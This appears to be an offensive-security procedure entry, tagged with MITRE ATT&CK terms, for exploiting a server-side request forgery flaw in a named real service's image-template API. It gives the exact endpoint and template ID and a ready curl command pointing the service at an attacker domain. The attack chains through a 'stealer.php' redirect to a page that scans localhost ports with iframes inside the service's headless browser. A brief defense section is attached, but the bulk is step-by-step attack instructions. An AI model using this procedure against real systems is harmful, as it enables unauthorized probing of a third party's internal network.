---
tags:
  - ssrf
  - exploitation
  - api-trigger
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: a8ca62ae-25b9-407c-ac46-622e273bd7b0
created_at: '2025-12-14T04:08:55.340Z'
updated_at: '2025-12-14T04:08:55.340Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-SSRF-via-Lemlist-Endpoint

## Summary

This procedure exploits the SSRF vulnerability by sending a crafted request to the Lemlist image template API with a malicious email parameter pointing to the attacker's redirection script, causing the service to fetch and execute the port scanning PoC in headless Chrome.

## Description

The vulnerable endpoint https://img.lemlist.com/api/image-templates/itp_vBBNpQuMsy6FYLQAc/?preview=true&email= lacks validation, allowing arbitrary URLs. By setting email to email@[attacker-domain], the service fetches the URL, hits stealer.php, redirects to PoC.html, and renders it in headless Chrome, executing JavaScript for port scanning via iframes (e.g., iframe.src = 'http://localhost:' + port). This enables localhost access. Prerequisites: Hosted files and public endpoint access.

## Requirements

1. Hosted attack files accessible via HTTP
2. Browser or tool to send HTTP requests to the API
3. Knowledge of the specific template ID (itp_vBBNpQuMsy6FYLQAc)

## Defense

Defensive measures and detection strategies:

- Implement URL validation to restrict to trusted domains
- Log and alert on requests to internal/localhost resources
- Disable external fetches in rendering pipelines

## Objectives

1. Initiate SSRF to access attacker-controlled content
2. Trigger redirection and PoC execution
3. Achieve localhost resource loading

## Instructions

### Step 1: Craft and Send Malicious Request

**Context**: Use the vulnerable endpoint with the attacker's domain in the email parameter to trigger the fetch.

No command required; access via browser or curl:

```bash
curl "https://img.lemlist.com/api/image-templates/itp_vBBNpQuMsy6FYLQAc/?preview=true&email=email@[YOUR-DOMAIN]"
```

> The service fetches email@[YOUR-DOMAIN], resolves to stealer.php, redirects to PoC.html?i=0, loads in headless Chrome, and starts scanning ports by setting iframe sources to localhost ports and monitoring onload.

### Step 2: Monitor Execution

**Context**: Observe if the PoC executes by checking for screenshot generation or logs.

Inspect the API response for screenshot artifacts indicating JavaScript ran.

> Success if the request completes without error and port scanning logic triggers.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- ssrf-trigger
- api-exploit
